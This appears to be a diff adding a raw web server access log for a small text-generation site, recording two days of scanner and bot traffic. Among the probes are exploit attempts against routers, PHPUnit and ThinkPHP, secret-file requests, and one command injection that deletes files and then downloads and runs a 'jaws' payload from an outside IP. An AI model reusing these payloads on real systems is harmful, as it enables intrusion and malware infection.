+172.104.242.173 - - [20/May/2023 05:49:25] "º«d¡EZCÛM\x87î^ý¿\x159 XÔ>\x12\x98Ä<à\x13Ï\x00¬ 9×\x90#8~\x8cÞ\x9dReF¿%1Qà\x9d\x06&g»\x82\x95\x19í\x07\x14\x19ZP\x80+\x94eÃæ\x85\x06¤\x99\x8b\x19l\x01ê\x88Y\x91\x16\x95ÄÈ\x0eH\x02Ç\x93gÁ4FW\x05|ûóT¸ýË»)ãÎÝÍ7\x9eïP\x8c¤[Vý\x98Él\x82õäÁd\x87X÷\x9b¿èq\x12\x99&Û,õ\x87×¨\x97j;ãê§´°\x02­\x8dE\x9bªB\x80\x0e)©é¯}\x18\x8e¸\x1e\x99\x04ï¨\x8cè\x04âÓí)1\x91Á\x8f\x88\x8c\x81ðÛ¥\x88\x95H\x9bZ«Î¿ôE%P*\x88KFY6\x9eç::jÔ\x8a¨V\x9aª«¯Ã&.í[\x04Åe\x7f\x08¾\x8ar§°\x99F÷\x11åÖ\x96\x8cIm+w\x1cýuU\x14\x0f!x¬èMPyÃ\x19!2 íÀ}!Rw\x14\x8e\x1bÄá ¯+­KkÅà\\s\x9c½Ë" HTTPStatus.BAD_REQUEST -
+194.180.48.85 - - [20/May/2023 05:54:51] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+109.237.98.226 - - [20/May/2023 06:08:24] "GET /.env HTTP/1.1" 404 -
+109.237.98.226 - - [20/May/2023 06:08:24] code 400, message Bad request version ('ï¸@¹Ò\x15\x9c^\x91:æÔtS\x13)\x04ÏpdÉé$Y¦,÷\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+109.237.98.226 - - [20/May/2023 06:08:24] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03[~)G)C®\x9dªé\x8d)ÙQe&l5!\x8b\x02\x0fs Ú$-\x92ÙÇ\x1eÔ ¡©ø\x9b\x09ï¸@¹Ò\x15\x9c^\x91:æÔtS\x13)\x04ÏpdÉé$Y¦,÷\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+179.43.177.244 - - [20/May/2023 06:25:34] "GET / HTTP/1.1" 200 -
+193.35.18.61 - - [20/May/2023 07:27:20] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+80.76.51.68 - - [20/May/2023 07:33:49] "GET /.git/config HTTP/1.1" 404 -
+80.76.51.68 - - [20/May/2023 07:33:49] "GET /.git/config HTTP/1.1" 404 -
+80.76.51.68 - - [20/May/2023 07:33:52] "GET /.git/config HTTP/1.1" 404 -
+80.76.51.68 - - [20/May/2023 07:33:52] "GET /.git/config HTTP/1.1" 404 -
+185.163.109.66 - - [20/May/2023 07:58:15] "GET / HTTP/1.1" 200 -
+185.163.109.66 - - [20/May/2023 07:58:16] "GET /robots.txt HTTP/1.1" 404 -
+185.163.109.66 - - [20/May/2023 07:58:16] "GET /sitemap.xml HTTP/1.1" 404 -
+185.163.109.66 - - [20/May/2023 07:58:16] "GET /.well-known/security.txt HTTP/1.1" 404 -
+185.163.109.66 - - [20/May/2023 07:58:17] "GET /favicon.ico HTTP/1.1" 404 -
+46.101.15.226 - - [20/May/2023 08:00:49] code 400, message Bad request syntax ('\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03¹\x12ßZ)¦üìÀñÊ\x13¿!a')
+46.101.15.226 - - [20/May/2023 08:00:49] "\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03¹\x12ßZ)¦üìÀñÊ\x13¿!a" HTTPStatus.BAD_REQUEST -
+114.116.220.83 - - [20/May/2023 08:02:31] "GET /admin/config.php HTTP/1.1" 404 -
+179.43.177.244 - - [20/May/2023 08:48:44] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+31.220.1.83 - - [20/May/2023 09:05:23] "GET / HTTP/1.1" 200 -
+139.59.77.147 - - [20/May/2023 09:46:03] "GET / HTTP/1.1" 200 -
+193.35.18.61 - - [20/May/2023 09:51:13] "GET / HTTP/1.1" 200 -
+45.128.232.62 - - [20/May/2023 10:03:40] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+139.162.207.100 - - [20/May/2023 10:06:11] "GET / HTTP/1.1" 200 -
+139.162.207.100 - - [20/May/2023 10:06:11] code 400, message Bad request version ('çGùK\x8fÅºg£\x02')
+139.162.207.100 - - [20/May/2023 10:06:11] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03e\x90\x8c'Âéô\x97\x97\x06¿½\x97\x1c­\x03×$0"\x81\x0dw;\\Y5\x91\x81ê¤\x8c \x19uB\x97dåpïí(ó\x17q\x9b\x1a\x12/\x1fçGùK\x8fÅºg£\x02\x0b" HTTPStatus.BAD_REQUEST -
+139.162.207.100 - - [20/May/2023 10:06:12] code 400, message Bad request version ('\x82]\x19´')
+139.162.207.100 - - [20/May/2023 10:06:12] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03\x0b¹µ=È\x03Ø\x81ú¹\x09ë\x06&[o\x1fòÞO\x85ó9Rä¸\x10i\x14\x01NÀ ÚÌYd8#|Îk\x97êÇñ#À¢\x9eÝ\x11Áó+q\x85\x82]\x19´" HTTPStatus.BAD_REQUEST -
+139.162.207.100 - - [20/May/2023 10:06:12] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+139.162.207.100 - - [20/May/2023 10:06:12] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03h\x8dkt°\x9cXú\x09ã\x18^a\x0bøö\x8cR#\x03óõ\x028®Éìý¨%oJ $¶Jd¬(/>©ïD\x8c\x06LnþoPP\x1d[úÐ\x84$g½ý\x82\x94xê\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+198.199.118.163 - - [20/May/2023 10:41:30] "GET /druid/index.html HTTP/1.1" 404 -
+120.157.47.4 - - [20/May/2023 10:43:54] "GET / HTTP/1.1" 200 -
+77.51.196.89 - - [20/May/2023 10:52:54] "GET / HTTP/1.1" 200 -
+213.180.203.107 - - [20/May/2023 11:21:46] "GET /robots.txt HTTP/1.1" 404 -
+5.45.207.171 - - [20/May/2023 11:21:46] "GET / HTTP/1.1" 200 -
+193.35.18.61 - - [20/May/2023 12:01:40] "GET / HTTP/1.1" 200 -
+193.35.18.61 - - [20/May/2023 12:01:40] "POST /HNAP1/ HTTP/1.1" 404 -
+49.143.32.6 - - [20/May/2023 12:12:08] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+74.82.47.3 - - [20/May/2023 12:40:02] "GET / HTTP/1.1" 200 -
+74.82.47.3 - - [20/May/2023 12:42:25] "GET /favicon.ico HTTP/1.1" 404 -
+74.82.47.3 - - [20/May/2023 12:43:21] "GET /geoserver/web/ HTTP/1.1" 404 -
+177.52.26.37 - - [20/May/2023 13:05:37] "GET / HTTP/1.1" 200 -
+117.26.208.31 - - [20/May/2023 13:19:21] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+45.79.181.94 - - [20/May/2023 13:52:08] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+45.79.181.94 - - [20/May/2023 13:52:08] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03bàL[¥¥Pz\x95@W\x08F" HTTPStatus.BAD_REQUEST -
+35.237.63.10 - - [20/May/2023 14:17:51] "GET / HTTP/1.1" 200 -
+35.237.63.10 - - [20/May/2023 14:17:51] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+35.237.63.10 - - [20/May/2023 14:17:51] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03V&\x12 ï)Ì\x14u\x06\x0fÞxÉþ®\x98\x92r\x14´¹ÁzUé½\x9c\x1bôH\x0c #§eÉ\x84©Üwª\x08³ðxÏ£\x1c·74Iü\x84Ã\x02\x01HñnÝþ(\x98\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+35.237.63.10 - - [20/May/2023 14:17:52] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+35.237.63.10 - - [20/May/2023 14:17:52] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03>\x09)oUª\x19\x0bÏ³\x001þ. ÀÔ\x89\x12®\x88[áV,ò²Sd\x0e\x18< ØmcÛ3R\x85ëóÉãNëí¨7ý\x04Ý¾*R\x08\x0eýVA9¤~£|\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+35.237.63.10 - - [20/May/2023 14:17:52] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+35.237.63.10 - - [20/May/2023 14:17:52] "\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03Y9_\x1a\x8fá¢S-W\x00p\x1eê?Ú½\x1fÁRÑecpYX!\x96Á(\x86I 9Ó;PÖ\x98k@\x8fH\x85¸åÙgé@5\x07>B¤>+\x1bQJ\x9arÙ¨A\x00$\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨À$À(À#À'\x00\x9f\x00\x9e\x00k\x00g\x00ÿ\x01\x00\x00\x8b\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+89.163.212.81 - - [20/May/2023 14:46:47] "GET / HTTP/1.1" 200 -
+89.163.212.81 - - [20/May/2023 14:46:55] "POST /HNAP1/ HTTP/1.1" 404 -
+46.34.193.237 - - [20/May/2023 14:55:58] "GET /favicon.ico HTTP/1.1" 404 -
+94.102.61.10 - - [20/May/2023 14:57:03] "GET / HTTP/1.1" 200 -
+65.21.107.241 - - [20/May/2023 15:07:28] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+65.21.107.241 - - [20/May/2023 15:07:28] "\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" HTTPStatus.BAD_REQUEST -
+192.241.224.19 - - [20/May/2023 15:44:26] "GET / HTTP/1.1" 200 -
+152.89.196.144 - - [20/May/2023 16:17:52] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+152.89.196.144 - - [20/May/2023 16:32:57] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+43.128.231.89 - - [20/May/2023 16:33:19] "GET / HTTP/1.1" 200 -
+152.89.196.144 - - [20/May/2023 16:36:59] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+152.89.196.144 - - [20/May/2023 16:52:13] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+152.89.196.144 - - [20/May/2023 16:57:34] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 -
+152.89.196.144 - - [20/May/2023 17:07:16] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+46.34.193.237 - - [20/May/2023 17:16:37] "GET /favicon.ico HTTP/1.1" 404 -
+152.89.196.144 - - [20/May/2023 17:44:17] "GET /console/ HTTP/1.1" 404 -
+152.89.196.144 - - [20/May/2023 17:54:17] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 -
+152.89.196.144 - - [20/May/2023 17:55:50] "GET /_ignition/execute-solution HTTP/1.1" 404 -
+152.89.196.144 - - [20/May/2023 18:08:38] "GET / HTTP/1.1" 200 -
+152.89.196.144 - - [20/May/2023 18:30:39] "POST /cgi-bin/../../../../bin/sh HTTP/1.1" 404 -
+152.89.196.144 - - [20/May/2023 18:42:01] "GET / HTTP/1.1" 200 -
+194.180.48.85 - - [20/May/2023 18:43:33] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+152.89.196.144 - - [20/May/2023 19:02:03] "GET /actuator/gateway/routes HTTP/1.1" 404 -
+152.89.196.144 - - [20/May/2023 19:16:36] "GET /geoserver HTTP/1.1" 404 -
+193.35.18.61 - - [20/May/2023 19:26:33] "GET / HTTP/1.1" 200 -
+193.35.18.61 - - [20/May/2023 19:26:33] "POST /HNAP1/ HTTP/1.1" 404 -
+122.194.11.97 - - [20/May/2023 19:41:20] "POST /HNAP1/ HTTP/1.0" 404 -
+45.83.64.151 - - [20/May/2023 21:59:44] "GET / HTTP/1.1" 200 -
+45.83.67.30 - - [20/May/2023 21:59:46] "GET /favicon.ico HTTP/1.1" 404 -
+179.43.177.244 - - [20/May/2023 22:01:14] "GET / HTTP/1.1" 200 -
+144.172.73.43 - - [20/May/2023 22:25:50] "GET / HTTP/1.1" 200 -
+194.180.48.85 - - [20/May/2023 23:11:03] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+198.235.24.200 - - [20/May/2023 23:33:43] "GET / HTTP/1.0" 200 -
+179.43.177.244 - - [20/May/2023 23:34:45] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+71.6.199.23 - - [20/May/2023 23:40:03] "GET / HTTP/1.1" 200 -
+71.6.199.23 - - [20/May/2023 23:40:04] "GET /robots.txt HTTP/1.1" 404 -
+71.6.199.23 - - [20/May/2023 23:40:04] "GET /sitemap.xml HTTP/1.1" 404 -
+71.6.199.23 - - [20/May/2023 23:40:04] "GET /.well-known/security.txt HTTP/1.1" 404 -
+71.6.199.23 - - [20/May/2023 23:40:06] "GET /favicon.ico HTTP/1.1" 404 -
+103.217.128.27 - - [21/May/2023 00:12:12] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 -
+87.250.224.201 - - [21/May/2023 00:19:26] "GET /robots.txt HTTP/1.1" 404 -
+5.255.231.32 - - [21/May/2023 00:19:26] "GET / HTTP/1.1" 200 -
+194.180.48.85 - - [21/May/2023 00:49:47] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+193.42.32.124 - - [21/May/2023 01:05:57] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+35.187.98.121 - - [21/May/2023 01:37:57] "GET / HTTP/1.1" 200 -
+79.124.59.170 - - [21/May/2023 01:41:19] "GET / HTTP/1.0" 200 -
+60.221.41.18 - - [21/May/2023 01:44:34] "GET /shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws HTTP/1.1" 404 -
+65.49.20.66 - - [21/May/2023 02:26:52] "GET / HTTP/1.1" 200 -
+65.49.20.66 - - [21/May/2023 02:28:39] "GET /favicon.ico HTTP/1.1" 404 -
+65.49.20.66 - - [21/May/2023 02:29:30] "GET /geoserver/web/ HTTP/1.1" 404 -
+92.255.85.152 - - [21/May/2023 03:00:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+92.255.85.152 - - [21/May/2023 03:00:58] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+107.170.246.9 - - [21/May/2023 03:36:26] code 400, message Bad request syntax ('MGLNDD_45.146.166.164_80')
+107.170.246.9 - - [21/May/2023 03:36:26] "MGLNDD_45.146.166.164_80" HTTPStatus.BAD_REQUEST -
+23.251.102.74 - - [21/May/2023 03:48:14] "GET / HTTP/1.1" 200 -
+109.237.97.180 - - [21/May/2023 04:11:01] "GET /.env HTTP/1.1" 404 -
+109.237.97.180 - - [21/May/2023 04:11:01] code 400, message Bad request version ('Ï¹Ðü@\x98q\x03|\x17)U\x13}\x02\x96a[R\x13ðE2äÉ\x04£\x91Ð³|s\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+109.237.97.180 - - [21/May/2023 04:11:01] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03Üs3\x08z>ô²¨ÓÝmã½Q`\x19\x95\x136±¾Ø\x0e­\x0f\x0c\x91\x9cîÛÆ Ï¹Ðü@\x98q\x03|\x17)U\x13}\x02\x96a[R\x13ðE2äÉ\x04£\x91Ð³|s\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+83.238.138.11 - - [21/May/2023 04:13:30] "GET / HTTP/1.1" 200 -
+46.13.147.184 - - [21/May/2023 06:19:45] "GET / HTTP/1.1" 200 -
+194.180.48.170 - - [21/May/2023 06:48:21] "GET /.env HTTP/1.1" 404 -
+194.180.48.170 - - [21/May/2023 06:48:21] "POST / HTTP/1.1" 405 -
+185.233.19.95 - - [21/May/2023 07:33:24] "GET / HTTP/1.1" 200 -
+81.28.6.204 - - [21/May/2023 08:14:40] "GET /.git/config HTTP/1.1" 404 -
+170.64.166.144 - - [21/May/2023 08:40:08] "GET /aaa9 HTTP/1.1" 404 -
+170.64.166.144 - - [21/May/2023 08:40:33] "GET /aab8 HTTP/1.1" 404 -
+170.64.166.144 - - [21/May/2023 08:40:44] "GET / HTTP/1.1" 200 -
+90.151.171.108 - - [21/May/2023 09:18:19] "CONNECT check.best-proxies.ru:443 HTTP/1.1" 404 -
+90.151.171.108 - - [21/May/2023 09:18:29] code 400, message Bad request syntax ('\x04\x01\x00P]«Îy0\x00')
+90.151.171.108 - - [21/May/2023 09:18:29] "\x04\x01\x00P]«Îy0\x00" HTTPStatus.BAD_REQUEST -
+90.151.171.108 - - [21/May/2023 09:18:30] "GET http://check.best-proxies.ru/ip.php?Z76365854670Q1 HTTP/1.1" 404 -
+90.151.171.108 - - [21/May/2023 09:18:40] code 400, message Bad request syntax ('\x05\x01\x00')
+90.151.171.108 - - [21/May/2023 09:18:40] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
+205.210.31.29 - - [21/May/2023 09:58:36] code 400, message Bad request version ('À(À$À\x14À')
+205.210.31.29 - - [21/May/2023 09:58:36] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03È\x8fùÑ9\x8aòZá"Åh\x1f\x12!}8x¿.P°\x84b\x92\x12Ìb,²\x85 \x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+51.158.37.186 - - [21/May/2023 10:18:58] "GET / HTTP/1.1" 200 -
+51.158.37.186 - - [21/May/2023 10:18:58] "GET /favicon.ico HTTP/1.1" 404 -
+49.143.32.6 - - [21/May/2023 12:02:24] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+34.79.162.186 - - [21/May/2023 12:28:43] "GET / HTTP/1.1" 200 -
+5.45.207.186 - - [21/May/2023 12:48:19] "GET /robots.txt HTTP/1.1" 404 -
+5.45.207.66 - - [21/May/2023 12:48:20] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [21/May/2023 13:00:16] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [21/May/2023 13:00:17] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [21/May/2023 13:00:18] "GET /favicon.ico HTTP/1.1" 404 -
+62.84.32.240 - - [21/May/2023 13:01:17] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [21/May/2023 13:01:17] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [21/May/2023 13:01:27] "GET /sdf HTTP/1.1" 404 -
+62.84.32.240 - - [21/May/2023 13:01:44] "GET /generate_text HTTP/1.1" 405 -
+62.84.32.240 - - [21/May/2023 13:01:53] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [21/May/2023 13:01:53] "GET /static/style.css HTTP/1.1" 304 -
